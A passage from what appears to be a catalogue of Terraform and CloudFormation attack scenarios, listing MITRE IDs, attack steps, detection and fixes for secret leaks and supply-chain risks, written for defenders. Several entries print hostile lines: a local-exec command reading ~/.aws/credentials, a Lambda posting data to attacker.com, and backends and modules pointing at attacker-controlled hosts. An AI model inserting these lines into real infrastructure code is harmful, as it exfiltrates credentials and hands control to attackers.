- **Attack Steps**: 1. A contributor with access to a shared Terraform repository adds a local-exec block inside a resource:```hclprovisioner "local-exec" { command = "cat ~/.aws/credentials
- **Detection**: Exfiltration of local cloud credentials
- **Solution**: None, unless outbound logs or egress filtering exists
- **Tags**: Ban local-exec in IaC; enforce peer review for all Terraform commits

## CloudFormation Nested Stack Passes Unencrypted Secrets

- **Attack Type**: Insecure Parameter Propagation
- **Target**: AWS Cloud Environment
- **Vulnerability**: Secrets passed as plain parameters
- **MITRE**: T1552.003
- **Impact**: Exposure of plaintext secrets via metadata APIs
- **Tools**: AWS CloudFormation, IAM
- **Scenario**: Secrets passed from parent to nested CloudFormation stacks without encryption.
- **Attack Steps**: 1. A parent CloudFormation template invokes a nested stack and passes parameters like DB credentials or API tokens:yaml<br>Parameters:<br> DBPassword:<br> Type: String<br> Default: myplaintextpassword<br>2. These values are passed as-is into nested stacks via the Parameters block.3. Nested stacks then use these parameters to provision resources, like RDS or Lambda.4. Because parameters are not marked NoEcho: true, they are logged in CloudFormation console and visible to all IAM users with cloudformation:DescribeStack* permissions.5. Malicious IAM users or compromised Lambda functions retrieve these logs using the AWS CLI.6. These secrets are then used to directly access sensitive resources.7. CloudTrail may log the activity, but unless parameter names are filtered, the threat goes unnoticed.8. Purple Team later flags this as a design flaw in stack orchestration.
- **Detection**: DescribeStacks + CloudTrail (partial)
- **Solution**: Use NoEcho: true for sensitive parameters; enforce strict IAM policies
- **Tags**: #cloudformation #secretexposure #nestedstack

## Terraform Plan Saved in Artifact Repository with Secrets

- **Attack Type**: Plan Artifact Leakage
- **Target**: CI/CD Artifact Repo
- **Vulnerability**: Secret-rich plan files uploaded insecurely
- **MITRE**: T1552.001
- **Impact**: Exposure of secrets and cloud creds via CI
- **Tools**: Terraform, GitHub Actions, Artifactory
- **Scenario**: Terraform plan file containing secrets is stored in CI/CD artifact storage, accessible to unauthorized users.
- **Attack Steps**: 1. A CI/CD pipeline runs terraform plan -out=tfplan.binary.2. The generated binary contains computed values including plaintext secrets (e.g., credentials from modules).3. The pipeline uploads this plan file as an artifact for later review:actions/upload-artifact or artifactory push.4. Artifact repository has overly broad access permissions (e.g., anyone in org can download).5. An insider or attacker with compromised CI credentials downloads the plan file.6. Using terraform show tfplan.binary, they extract sensitive computed values.7. With access to secrets (DB passwords, tokens), they move laterally into production infra.8. The breach is discovered during audit log review or suspicious access in artifact downloads.
- **Detection**: Audit logs of artifact downloads
- **Solution**: Avoid persisting plan files; restrict artifact access; mask sensitive outputs
- **Tags**: #terraform #planleak #artifactstorage

## Public GitHub Issue Contains Terraform Debug Output

- **Attack Type**: Accidental Secret Leak in Debug Logs
- **Target**: GitHub Issues
- **Vulnerability**: Posting of verbose logs to public channels
- **MITRE**: T1530
- **Impact**: Compromise via debug log mismanagement
- **Tools**: GitHub Issues, Terraform Debug Logs
- **Scenario**: Terraform debug logs posted to public GitHub issues include full variable values and backend config.
- **Attack Steps**: 1. A developer faces an issue during Terraform execution and posts logs to GitHub Issue tracker.2. They forget to sanitize TF_LOG=DEBUG output, which contains full request payloads, including AWS credentials, state paths, or provider tokens.3. The issue is in a public repo, visible to anyone.4. A bug bounty researcher or malicious actor scrapes the GitHub issue tracker for such logs.5. They extract secrets and use them to authenticate into AWS or Terraform Cloud.6. As debug logs contain many internal details, the attacker gains a complete picture of the infra.7. Blue Team is unaware unless GitHub alerts or external reporting happens.8. Purple Team recommends redaction and validation gates for external issue creation.
- **Detection**: GitHub secret scanning (delayed)
- **Solution**: Enforce debug sanitization, add pre-commit checks, train developers
- **Tags**: #terraform #debugleak #githubissue

## CloudFormation Template Commits Plaintext AWS Access Keys

- **Attack Type**: Access Key in YAML
- **Target**: GitHub Public Repo
- **Vulnerability**: Hardcoded credentials in IaC files
- **MITRE**: T1552.001
- **Impact**: Unauthorized AWS access and resource abuse
- **Tools**: AWS, GitHub
- **Scenario**: An engineer mistakenly includes active AWS access keys in a CloudFormation YAML file and commits it.
- **Attack Steps**: 1. While testing a CloudFormation deployment, a developer hardcodes credentials:AWS_ACCESS_KEY_ID: AKIA...AWS_SECRET_ACCESS_KEY: abc123...2. These lines are part of a parameters section or user-data script.3. The file is committed to version control and pushed to GitHub.4. GitHub's automated secret scanning system detects the key and flags it.5. But the notification is delayed or ignored.6. An attacker monitoring GitHub public commits finds the access key using GitHub search or dorking.7. They use AWS CLI to list, modify, or delete cloud resources.8. AWS notifies the user of abuse, and emergency key rotation is triggered.9. Post-mortem identifies poor secret hygiene and lack of commit scanning.
- **Detection**: GitHub secret detection + AWS abuse alerts
- **Solution**: Never commit keys; use environment variables and CI secrets
- **Tags**: #cloudformation #accesskey #secretdetection

## Terraform Module Sources Include Malicious Git Repos

- **Attack Type**: Third-Party Module Risk
- **Target**: Cloud Infra via Terraform
- **Vulnerability**: Trust in unaudited IaC modules
- **MITRE**: T1195.002
- **Impact**: Remote code execution or misconfig via module
- **Tools**: Terraform CLI, GitHub
- **Scenario**: Terraform modules are sourced from untrusted public repositories, which contain backdoored code.
- **Attack Steps**: 1. A Terraform module is declared like:source = "git::https://github.com/malicious-user/iac-module.git"2. The module contains hidden null_resource blocks that run local-exec or provision open security groups.3. Developer unknowingly uses the module for production deployment.4. On terraform apply, the code executes locally and/or provisions vulnerable infra.5. Attacker's script runs in dev machine or opens access to attacker-controlled IPs.6. The attack remains hidden, as third-party modules are often assumed safe.7. Purple Team identifies that dependencies were not vetted or pinned to SHA hashes.8. This leads to a review of all third-party sources.
- **Detection**: Git module inspection (manual)
- **Solution**: Use private registries or verify and pin modules
- **Tags**: #terraform #thirdparty #modulesecurity

## CloudFormation Metadata Block Leaks User Credentials

- **Attack Type**: Metadata-Based Exposure
- **Target**: AWS Infra
- **Vulnerability**: Misuse of Metadata for storing secrets
- **MITRE**: T1530
- **Impact**: Credential theft via API-readable template
- **Tools**: AWS CloudFormation
- **Scenario**: Sensitive environment variables are exposed in the Metadata section of CloudFormation templates.
- **Attack Steps**: 1. CloudFormation supports a Metadata field to include build or versioning info.2. A developer includes env vars for convenience:Metadata: EnvVars: { DB_PASSWORD: "secret123" }3. The stack is deployed and the template is retrievable via API calls.4. Any IAM user with cloudformation:GetTemplate can see the raw YAML, including metadata.5. A compromised EC2 instance or Lambda uses this to steal credentials.6. Since Metadata is not sensitive by default, no alerts trigger.7. The attacker uses DB creds to connect to RDS or other sensitive resources.8. Detection only occurs after suspicious database access is investigated.
- **Detection**: API logs for GetTemplate calls
- **Solution**: Never store secrets in metadata; enforce template reviews
- **Tags**: #cloudformation #metadata #apileak

## .terraform/environment File Commits Reveal Workspace Names

- **Attack Type**: Metadata Recon
- **Target**: GitHub
- **Vulnerability**: Committed workspace metadata
- **MITRE**: T1592
- **Impact**: Recon value for phishing or targeting
- **Tools**: GitHub, Terraform
- **Scenario**: Committed environment files reveal structure of Terraform workspaces and environment names.
- **Attack Steps**: 1. Terraform auto-generates .terraform/environment file when workspaces are used.2. Developers commit this file into Git unknowingly.3. The file contains only the name of the workspace (e.g., production or financial-data-infra).4. An attacker sees this in a public repo and maps the organization's infra naming conventions.5. They launch targeted social engineering campaigns referencing known workspace names.6. This increases credibility in phishing or credential harvesting attacks.7. The leak itself contains no credentials but provides important recon value.8. Purple Team recommends .terraform/ be added to .gitignore.
- **Detection**: GitHub DLP or repo review
- **Solution**: Add .terraform/ to .gitignore always
- **Tags**: #terraform #workspace #recon

## CloudFormation Resource Policies Set with Wildcard * Principal

- **Attack Type**: Overly Permissive Resource Policy
- **Target**: AWS S3
- **Vulnerability**: Wildcard principal in resource policy
- **MITRE**: T1068
- **Impact**: Public data leak from misconfigured bucket
- **Tools**: AWS CloudFormation, S3
- **Scenario**: A developer configures an S3 bucket policy in CloudFormation allowing "Principal": "*" leading to public access.
- **Attack Steps**: 1. CloudFormation template creates an S3 bucket with this policy:"Principal": "*""Action": "s3:GetObject""Resource": "arn:aws:s3:::data/*"2. The intention was to allow only internal access, but wildcard principal makes all objects public.3. The bucket hosts logs or sensitive documents.4. A crawler or external actor accesses s3.amazonaws.com/data/filename directly.5. Files are downloaded, leading to data leak or compliance violation.6. Blue Team notices via AWS Trusted Advisor or threat reports.7. Root cause is found to be a misconfigured policy in IaC.
- **Detection**: AWS Config, Trusted Advisor
- **Solution**: Avoid * in resource policies; enforce security linter checks
- **Tags**: #s3 #cloudformation #publicbucket

## Terraform Backend Config Includes Reused Global Bucket

- **Attack Type**: Shared Backend Collisions
- **Target**: AWS S3 + Terraform
- **Vulnerability**: Shared, unsegmented state backend
- **MITRE**: T1574.002
- **Impact**: Cross-env corruption and possible privilege escalation
- **Tools**: Terraform, AWS S3
- **Scenario**: Multiple environments use the same S3 backend bucket without prefixing, leading to potential state overwrites.
- **Attack Steps**: 1. Dev, staging, and prod environments all use the same backend config:bucket = "global-terraform-state"key = "infrastructure.tfstate"2. Due to lack of key namespacing (e.g., env/dev.tfstate), all apply operations overwrite the same state file.3. Developer A runs apply in dev while Developer B simultaneously applies in prod.4. This creates race conditions and cross-environment drift.5. Worse, if a malicious actor in dev modifies Terraform config, the prod environment is impacted.6. The overlapping state causes a cascade of configuration corruption.7. Detection occurs when unexpected resources disappear or are re-created in prod.8. Root cause is traced back to shared backend key.
- **Detection**: S3 versioning logs, drift detection
- **Solution**: Always namespace backend keys per environment
- **Tags**: #terraform #backend #envdrift

## Exposed Terraform State File Reveals All Secrets

- **Attack Type**: Terraform State Exposure
- **Target**: S3 Bucket
- **Vulnerability**: Public access to unencrypted state file
- **MITRE**: T1552.001
- **Impact**: Complete infrastructure compromise
- **Tools**: Terraform, AWS S3, AWS CLI
- **Scenario**: Terraform state file stored in a public S3 bucket reveals secrets in plaintext.
- **Attack Steps**: 1. Terraform state (terraform.tfstate) stores sensitive data like resource attributes, credentials, and connection strings in plaintext.2. A DevOps engineer configures remote backend using S3 bucket, but forgets to enable encryption and access control.3. Bucket policy is misconfigured or left public ("Principal": "*"), making the file world-readable.4. An attacker enumerates S3 buckets using tools like awscli or open-source scanners (e.g., grayhatwarfare).5. They download the state file and extract secrets (e.g., db_password, private_key, or API tokens).6. Using the information, the attacker connects to production databases or takes over cloud resources.7. The exposure remains undetected until abnormal access is noticed in logs or via bug bounty disclosures.8. Purple Team recommends rotating exposed secrets and refactoring IaC to avoid sensitive values in state.
- **Detection**: S3 access logs, bug bounty alerts
- **Solution**: Encrypt state files, restrict bucket access, and redact outputs
- **Tags**: #terraform #statefile #s3exposure

## Terraform Outputs Leak Sensitive Data via Console

- **Attack Type**: Sensitive Output Disclosure
- **Target**: CI/CD Logs
- **Vulnerability**: Logging of secrets via Terraform output
- **MITRE**: T1530
- **Impact**: Secret exposure through logs
- **Tools**: Terraform CLI, CI/CD Logs
- **Scenario**: Terraform outputs sensitive variables (e.g., passwords, tokens) to console and logs.
- **Attack Steps**: 1. In outputs.tf, a developer defines outputs like:hcl<br>output "rds_password" { value = var.db_password }<br>2. This value is printed during terraform apply, appearing in CI logs and Terraform CLI output.3. CI/CD pipelines log these stdout streams to services like GitHub Actions, GitLab, Jenkins, or cloud logging (e.g., CloudWatch).4. Logs may be stored in insecure locations or visible to all team members with access.5. An insider or external actor who gains log access sees the full password/token.6. They use it to access critical services (e.g., RDS, Redis, or Vault).7. This often goes unnoticed, as output logging is rarely audited.8. Purple Team recommends marking outputs as sensitive = true to prevent logging.
- **Detection**: Review pipeline logs or CI vaults
- **Solution**: Mark outputs as sensitive; review CI log visibility
- **Tags**: #terraform #outputleak #cicdlogs

## CloudFormation UserData Exposes Credentials in EC2

- **Attack Type**: UserData Misuse
- **Target**: EC2 Instance
- **Vulnerability**: Credentials stored in UserData field
- **MITRE**: T1552.007
- **Impact**: AWS access compromise from instance metadata
- **Tools**: AWS CloudFormation, EC2 Metadata
- **Scenario**: EC2 UserData script in CloudFormation contains hardcoded AWS credentials and is readable from metadata URL.
- **Attack Steps**: 1. Developer adds a setup script in CloudFormation using the UserData field of an EC2 instance.2. Script includes plaintext AWS access keys and secret tokens for automation:export AWS_SECRET_ACCESS_KEY=abc1233. When EC2 is provisioned, the script runs and is stored under EC2’s metadata endpoint (http://169.254.169.254/latest/user-data).4. Any process or user on the EC2 instance can retrieve this by cURL.5. If the EC2 instance is compromised (e.g., via SSRF or RCE), attacker fetches the user-data and extracts credentials.6. With those, the attacker accesses the AWS account or pivots further.7. Detection is difficult unless CloudTrail logs indicate anomalous access.8. Purple Team flags this in IaC reviews and recommends removing secrets from UserData.
- **Detection**: EC2 metadata access logs (if monitored)
- **Solution**: Never store secrets in UserData; use SSM or IAM roles
- **Tags**: #cloudformation #userdata #metadataleak

## Committed Terraform .tfvars File Leaks API Tokens

- **Attack Type**: .tfvars Credential Leakage
- **Target**: Public Git Repo
- **Vulnerability**: Secrets stored in .tfvars and committed
- **MITRE**: T1552.001
- **Impact**: Unauthorized access to third-party services
- **Tools**: GitHub, Git, Terraform
- **Scenario**: Developers push .tfvars files containing secrets (like API keys) to version control.
- **Attack Steps**: 1. Terraform supports .tfvars files to store variable values like tokens, passwords, keys.2. Developer creates secrets.tfvars containing:api_token = "sk_live_xxx"3. By mistake, the file is added to Git and pushed to a public GitHub repository.4. GitHub’s secret scanning alerts the user, but it’s delayed or ignored.5. Attackers monitoring GitHub search for leaked secrets using dorking or GitHub's code search API.6. Upon finding the token, they authenticate into services like Stripe, SendGrid, or even cloud providers.7. The breach is detected only when fraudulent charges or unauthorized API calls occur.8. Secrets must be revoked, and the Git history cleaned (via bfg or git filter-branch).
- **Detection**: GitHub code scanning, audit logs
- **Solution**: Add .tfvars to .gitignore; use vaults for secrets
- **Tags**: #terraform #tfvars #secretleak

## CloudFormation Custom Resource Fetches Payload from Attacker

- **Attack Type**: External Callback Execution
- **Target**: Cloud Infra via Lambda
- **Vulnerability**: Unverified callback in custom resource
- **MITRE**: T1102.002
- **Impact**: Exfiltration of metadata during stack create
- **Tools**: AWS Lambda, CloudFormation, DNS
- **Scenario**: Malicious or compromised CloudFormation custom resource makes HTTP call to attacker domain.
- **Attack Steps**: 1. A custom resource is defined in CloudFormation, pointing to a Lambda function for logic like user provisioning or DNS record creation.2. Inside Lambda, a developer hardcodes or mistakenly leaves an external callback:requests.post("https://attacker.com/callback", json=data)3. Every CloudFormation stack that uses this resource sends sensitive metadata (e.g., IAM roles, ARNs, user info) to the attacker.4. The attacker logs this data to map the cloud environment and launch future attacks.5. This callback can also act as a C2 channel.6. Detection is hard unless DNS logging or outbound monitoring is enabled.7. Blue Team identifies the anomaly via increased traffic to unknown domains.8. Fix includes validating Lambda dependencies and removing outbound callbacks.
- **Detection**: DNS logs, VPC Flow Logs
- **Solution**: Block unknown outbound access in VPC; review Lambda code
- **Tags**: #cloudformation #callback #customresource

## Terraform Workspace Isolation Broken by Shared Variables

- **Attack Type**: Workspace Confusion
- **Target**: Cloud Infra
- **Vulnerability**: Poor variable scoping across workspaces
- **MITRE**: T1574.002
- **Impact**: Environment mixing and infra instability
- **Tools**: Terraform, GitHub Actions
- **Scenario**: Global variables are shared across Terraform workspaces, leading to variable bleed and misconfigurations.
- **Attack Steps**: 1. Terraform workspaces isolate state files but not variable definitions unless explicitly handled.2. A terraform.tfvars file in the root folder defines environment = "prod".3. Developer switches to dev workspace but doesn’t override the environment var.4. On apply, resources are created in the production environment with development configurations.5. This causes config drift, untracked changes, or even downtime if incompatible resources overwrite each other.6. Blue Team notices infra behaving differently from intended setup.7. Purple Team finds that workspaces were not fully isolated — same variables, same backend.8. Teams are advised to use per-workspace tfvars or directory structures.
- **Detection**: Cloud drift tools, manual diff checks
- **Solution**: Use per-workspace variables and naming conventions
- **Tags**: #terraform #workspace #scoping

## CloudFormation Template Hosts AWS Root Access Key

- **Attack Type**: Root Credential Exposure
- **Target**: Git Repos
- **Vulnerability**: Root key misuse in templates
- **MITRE**: T1552.001
- **Impact**: Complete account compromise
- **Tools**: AWS CloudFormation, Git
- **Scenario**: Developer copies root account key into template variables for quick testing, leaving it in version control.
- **Attack Steps**: 1. A developer working late adds AWS root account access keys into template params for expediency.2. These parameters are not marked as sensitive or protected by KMS.3. The template is pushed into Git and possibly mirrored to a public repo.4. GitHub triggers secret scanning, but alert is missed.5. Within minutes, bots or attackers find and use the key via AWS CLI.6. Full control over the AWS account is achieved — including deletion of services, billing, or ransomware on cloud data.7. AWS suspends the account temporarily due to abuse.8. A full incident response and root key revocation follow.9. Purple Team stresses that root keys must never be used programmatically.
- **Detection**: GitHub alerts + AWS abuse detection
- **Solution**: Use IAM roles; disable root API access
- **Tags**: #cloudformation #rootkey #gitleak

## Terraform Provider Block Logs Plaintext Secrets

- **Attack Type**: Provider Debug Info
- **Target**: Developer Terminals, CI/CD
- **Vulnerability**: Verbose provider logs reveal tokens
- **MITRE**: T1552.003
- **Impact**: Compromise of tokens via logs
- **Tools**: Terraform CLI, Vault Provider
- **Scenario**: Terraform provider plugin logs sensitive info (like bearer tokens) to terminal or logs.
- **Attack Steps**: 1. A Terraform provider (e.g., vault, kubernetes, or custom one) takes secrets via provider block.2. Due to a bug or verbose logging (TF_LOG=DEBUG), the CLI logs API requests including sensitive headers or body data.3. These logs are saved to disk or printed in CI/CD jobs.4. An attacker with access to logs retrieves bearer tokens, Vault secrets, or API credentials.5. The risk escalates if CI logs are sent to external logging systems (e.g., Splunk, ELK) without redaction.6. Purple Team finds these via centralized log reviews.7. Developers are unaware of logging side-effects.8. Solution involves rotating secrets and upgrading provider versions.
- **Detection**: Review logs for provider debug info
- **Solution**: Limit logging levels; redact logs; update provider
- **Tags**: #terraform #providerlogs #debugsecrets

## CloudFormation Outputs Reveal IAM Roles to Public Stack Viewers

- **Attack Type**: Output Enumeration
- **Target**: AWS IAM
- **Vulnerability**: Unrestricted read to stack outputs
- **MITRE**: T1069.003
- **Impact**: Enumeration and prep for privilege abuse
- **Tools**: AWS CloudFormation, IAM
- **Scenario**: IAM Role ARNs are outputted in public stacks, enabling attackers to enumerate valid principals.
- **Attack Steps**: 1. In a CloudFormation template, outputs include:output "AdminRole" { value = "arn:aws:iam::1234567890:role/Admin" }2. The stack is deployed in a shared AWS account with many IAM users.3. Because IAM policies allow cloudformation:DescribeStacks, any user can view the outputs.4. Malicious users scrape these values to map the IAM structure.5. The output ARNs are later used in AssumeRole or STS privilege escalation attempts.6. Detection only occurs when unusual STS API calls are noticed.7. Purple Team recommends scoping outputs to only trusted users.
- **Detection**: CloudTrail STS logs, IAM policy review
- **Solution**: Limit DescribeStack permissions; avoid sensitive outputs
- **Tags**: #cloudformation #iam #stackoutput

## Terraform HTTP Backend Points to Attacker-Controlled Server

- **Attack Type**: Remote Backend Hijack
- **Target**: Terraform State Backend
- **Vulnerability**: Insecure backend source usage
- **MITRE**: T1195.002
- **Impact**: Remote manipulation or telemetry
- **Tools**: Terraform CLI, HTTP Server
- **Scenario**: Backend block in Terraform config uses attacker-controlled HTTP endpoint.
- **Attack Steps**: 1. A developer configures Terraform backend:backend "http" { address = "http://malicious.site/state" }2. This URL is controlled by the attacker posing as a trusted registry or mirror.3. On terraform init, the CLI sends requests to this backend and expects JSON state data.4. The malicious server returns crafted state, injecting resources or remote commands.5. When terraform apply runs, the fake state influences the real infrastructure.6. Alternatively, the attacker logs metadata like tokens, IP, or module names.7. Detection occurs only if DNS or HTTP logs flag the suspicious domain.8. Fix includes validating backend URLs and using HTTPS-only sources.
- **Detection**: DNS logs, anomaly detection
- **Solution**: Only use verified backend endpoints with TLS
- **Tags**: #terraform #backend #remoteexploit

## Terraform State Stored in Git History

- **Attack Type**: Git Leak of Sensitive Infra State
- **Target**: Git Repository
- **Vulnerability**: Terraform state file stored and committed to Git
- **MITRE**: T1552.001
- **Impact**: Infrastructure and secret exposure
- **Tools**: Git, Terraform, GitHub
- **Scenario**: Terraform state file accidentally committed to Git repo, leaking secrets and live infrastructure metadata.
- **Attack Steps**: 1. A developer initially stores terraform.tfstate locally during early-stage testing.2. Without .gitignore configured, the file is committed to Git and pushed to remote (GitHub, GitLab, etc.).3. The state file contains sensitive metadata including AWS resource ARNs, plaintext passwords, tokens, and internal hostnames.4. Even after removing the file, secrets remain accessible in Git history.5. Attackers scan GitHub using dorks or APIs to locate such leaks.6. They reconstruct cloud architecture and attempt to reuse credentials.7. Compromise occurs if credentials are still valid.8. Mitigation involves secret rotation, Git history cleaning (BFG, filter-branch), and adding .tfstate to .gitignore.
- **Detection**: GitHub secret scanning, manual repo audit
- **Solution**: Clean Git history, rotate all exposed secrets, enforce .gitignore
- **Tags**: #terraform #git #stateleak

## Unencrypted CloudFormation Stack Parameters Leak Secrets

- **Attack Type**: Parameter Misconfiguration
- **Target**: CloudFormation Stack
- **Vulnerability**: Improper parameter visibility configuration
- **MITRE**: T1552.001
- **Impact**: Secret exposure via cloud UI or CLI
- **Tools**: AWS CloudFormation Console, CLI
- **Scenario**: Sensitive CloudFormation parameters passed in plaintext and viewable by users.
- **Attack Steps**: 1. CloudFormation templates allow defining parameters via CLI or web UI (e.g., --parameters ParameterKey=DBPassword,ParameterValue=mysecret).2. Developer deploys stack with secrets passed via CLI or stored in parameter JSON/YAML.3. These parameters are not marked as NoEcho, so anyone with DescribeStack access can view the secrets in plaintext.4. An attacker (internal or compromised user) enumerates stacks and extracts parameters.5. The attacker then accesses database resources or IAM roles using these credentials.6. Detection is difficult without fine-grained permission logs.7. Blue Team discovers misuse during IAM policy review.8. Fix includes setting NoEcho: true on sensitive parameters and limiting DescribeStack privileges.
- **Detection**: Stack configuration audit, IAM logs
- **Solution**: Use NoEcho: true on all sensitive parameters
- **Tags**: #cloudformation #parameterleak #awsconfig

## Terraform Local Backend File Left on Shared Workstation

- **Attack Type**: Shared Device Residual Data
- **Target**: Shared Developer Systems
- **Vulnerability**: Local state file unprotected on shared systems
- **MITRE**: T1552.006
- **Impact**: Insider access to secrets via shared disk
- **Tools**: Terraform CLI, Shared Workstation
- **Scenario**: Local backend file contains state and secrets, but is left unprotected on shared machine.
- **Attack Steps**: 1. A DevOps engineer tests Terraform config using the default local backend, which stores state in terraform.tfstate.2. The workstation used is a shared development terminal or jump server without isolated user profiles.3. After use, the file remains on disk and is accessible by other developers or attackers with access to the same machine.4. The file includes resource states with plaintext credentials, tokens, or IPs.5. Another user extracts the state file and leverages the credentials to access services.6. No audit trail is generated because this happens at the local file system level.7. Purple Team discovers this during physical or insider threat assessment.8. Fix includes enforcing file cleanup, encrypting local storage, and preferring remote backends.
- **Detection**: File system audit, user access review
- **Solution**: Use remote backends; wipe local state files; segment user access
- **Tags**: #terraform #localbackend #insiderthreat

## Public CloudFormation Template URL Reveals Entire Stack

- **Attack Type**: Public Template Link Exposure
- **Target**: CloudFormation Stack
- **Vulnerability**: Public template exposure via URL
- **MITRE**: T1210
- **Impact**: Cloud architecture disclosure
- **Tools**: AWS CloudFormation, Pastebin, S3
- **Scenario**: Stack is deployed from a publicly hosted template URL containing sensitive logic and outputs.
- **Attack Steps**: 1. Developer uploads template.yaml to a public S3 bucket or paste site (e.g., Pastebin) to test stack deployment.2. Uses --template-url https://example.com/template.yaml in the deployment command.3. The link is never revoked or access-limited, allowing anyone to retrieve the full template.4. The file includes IAM role policies, resource names, and stack outputs with sensitive identifiers.5. An attacker scans public URLs or gets access through leaked chat/email history.6. Using the content, they map cloud structure or prepare for phishing/internal spoofing.7. Blue Team realizes leak only when logs show unusual access.8. Fix involves storing templates in private buckets with pre-signed URL expiration.
- **Detection**: Web access logs, S3 bucket audit
- **Solution**: Use secure template storage, pre-signed URLs, access logs
- **Tags**: #cloudformation #publicurl #templateleak

## Terraform Modules from Insecure Source Inject Backdoor

- **Attack Type**: Malicious Module Supply Chain
- **Target**: Cloud Infra via Terraform
- **Vulnerability**: Unverified module used directly from external repo
- **MITRE**: T1195.002
- **Impact**: Silent backdoor in deployed infrastructure
- **Tools**: Terraform Registry, GitHub
- **Scenario**: Terraform module pulled from untrusted source injects resource changes or secrets exfil.
- **Attack Steps**: 1. Developer uses a public module from GitHub or Terraform Registry (source = "git::https://github.com/attacker/module.git").2. Module includes malicious resource blocks that exfiltrate metadata or create admin IAM roles.3. On terraform apply, attacker-controlled resources are silently added.4. Backdoor allows future control via assumed roles or webhooks.5. Detection is difficult unless full review of module code is done.6. Purple Team identifies third-party dependency misuse.7. Attackers exploit trust in the Registry or typo-squatted repo names.8. Teams must vendor, pin, and scan all external modules.
- **Detection**: Code audit, supply chain scanning
- **Solution**: Pin versions, use vetted modules, scan for tampering
- **Tags**: #terraform #modules #supplychainattack

## CloudFormation Stack Logs Stored in Public CloudWatch

- **Attack Type**: Misconfigured Logging
- **Target**: CloudWatch Logs
- **Vulnerability**: Log permissions misconfigured
- **MITRE**: T1552.003
- **Impact**: Infrastructure insight and data theft
- **Tools**: AWS CloudWatch, CloudFormation
- **Scenario**: Stack creation logs reveal sensitive deployment info accessible via overly permissive CloudWatch.
- **Attack Steps**: 1. Stack deployment logs are stored in CloudWatch (e.g., Lambda outputs, failed commands, secrets in stdout).2. CloudWatch Logs policy is set to allow logs:DescribeLogStreams to *.3. An IAM role with wide access can read these logs and extract secrets or debug data.4. In case of failed stack operations, secrets are often logged by accident (e.g., curl with bearer token).5. Detection depends on audit trail of who accessed logs.6. Blue Team finds leak during CloudWatch review.7. Fix includes log redaction, permission hardening, and automatic scanning for secrets in logs.
- **Detection**: CloudTrail, IAM Access Analyzer
- **Solution**: Harden log permissions; scan logs for secrets
- **Tags**: #cloudwatch #stacklogs #logleak

## Terraform Environment Variables Leaked via CI Logs

- **Attack Type**: CI Variable Exposure
- **Target**: CI/CD Logs
- **Vulnerability**: Unmasked secret variables in CI log output
- **MITRE**: T1552.001
- **Impact**: Cloud account access via log extraction
- **Tools**: GitHub Actions, GitLab CI, Terraform
- **Scenario**: Terraform runs in CI pipeline where env vars like AWS_SECRET_ACCESS_KEY are printed to logs.
- **Attack Steps**: 1. CI/CD pipelines inject secrets via environment variables (AWS_SECRET_ACCESS_KEY, etc.)2. Terraform runs with debug mode or with scripts that echo these vars.3. Logs are uploaded to shared or public log viewers.4. Logs remain accessible long after pipeline run.5. An attacker browsing CI logs (via UI or API) can extract secrets.6. Blue Team only discovers this upon bug bounty disclosure or token abuse.7. Fix involves masking env vars in CI, rotating secrets, and hardening log visibility.
- **Detection**: CI Logs + GitHub Actions Secret Scanning
- **Solution**: Mask env vars; restrict log access
- **Tags**: #terraform #cicd #envleak

## CloudFormation Outputs Display Open Security Group Rules

- **Attack Type**: Insecure Output Disclosure
- **Target**: CloudInfra Stack
- **Vulnerability**: Exposed ingress info in stack outputs
- **MITRE**: T1069
- **Impact**: Exposure of attack surface
- **Tools**: AWS CloudFormation
- **Scenario**: Stack outputs include security group ingress rules that reveal open IP ranges (e.g., 0.0.0.0/0).
- **Attack Steps**: 1. Developer outputs the SecurityGroupIngress config as part of Outputs section for troubleshooting.2. It includes CIDR blocks like 0.0.0.0/0 and ports like 22 (SSH), 3306 (MySQL).3. Anyone with stack visibility can see how exposed the infrastructure is.4. Attackers leverage this for port scanning or targeted brute force.5. Blue Team discovers open rules only after access logs show anomalous scans.6. Fix is to avoid outputting security rules and audit ingress permissions.
- **Detection**: CloudTrail logs, VPC Flow logs
- **Solution**: Remove sensitive outputs, restrict access to DescribeStacks
- **Tags**: #cloudformation #securitygroup #openports

## Terraform Variable File Uploaded to Slack

- **Attack Type**: Accidental File Sharing
- **Target**: Internal Comms Platform
- **Vulnerability**: Sensitive file shared on public chat
- **MITRE**: T1537
- **Impact**: Secret leakage via internal channels
- **Tools**: Slack, Terraform
- **Scenario**: .tfvars file containing secrets is shared via Slack or Teams during peer code review.
- **Attack Steps**: 1. Developer shares prod.tfvars during review, forgetting it contains secrets like API keys.2. File is uploaded to Slack or Teams.3. Depending on workspace settings, file becomes searchable or downloadable by others.4. Slack archives files indefinitely unless cleaned.5. An insider or compromised Slack account accesses the file and retrieves credentials.6. Detection occurs only during DLP or audit review.7. Purple Team recommends redacting sensitive content before sharing files.8. Security settings must restrict secret sharing over chat.
- **Detection**: Slack Enterprise DLP, manual audits
- **Solution**: Restrict uploads; scrub files; enforce secret detection
- **Tags**: #terraform #slackleak #tfvars

## CloudFormation Template Includes Static Admin Password

- **Attack Type**: Hardcoded Password in Template
- **Target**: GitHub Repo
- **Vulnerability**: Hardcoded secrets in IaC templates
- **MITRE**: T1552.001
- **Impact**: Direct service compromise via public template
- **Tools**: AWS CloudFormation, Git
- **Scenario**: Static admin password is defined inside CloudFormation resource definition.
- **Attack Steps**: 1. Developer creates an RDS resource in CloudFormation with the following:MasterUserPassword: "admin123"2. This value is hardcoded in the template file and committed to version control.3. The template is stored in a public Git repo.4. Attackers find the password via GitHub dorking or search.5. They connect directly to the RDS instance or reuse the password elsewhere.6. Blue Team only discovers after incident response or bug bounty alert.7. Fix is to use dynamic secrets via SSM or Secrets Manager, and never hardcode passwords in IaC.
- **Detection**: GitHub code scanning, network logs
- **Solution**: Store secrets in Secrets Manager or Parameter Store
- **Tags**: #cloudformation #password #templateleak

## Terraform Remote State Shared Between Projects

- **Attack Type**: Cross-Project State Exposure
- **Target**: Shared S3/GCS Buckets
- **Vulnerability**: Lack of isolation in backend configuration
- **MITRE**: T1565.002
- **Impact**: Cross-environment tampering or infra damage
- **Tools**: Terraform, AWS S3, GCP Storage
- **Scenario**: A shared backend bucket allows different teams/projects to access each other’s Terraform state unintentionally.
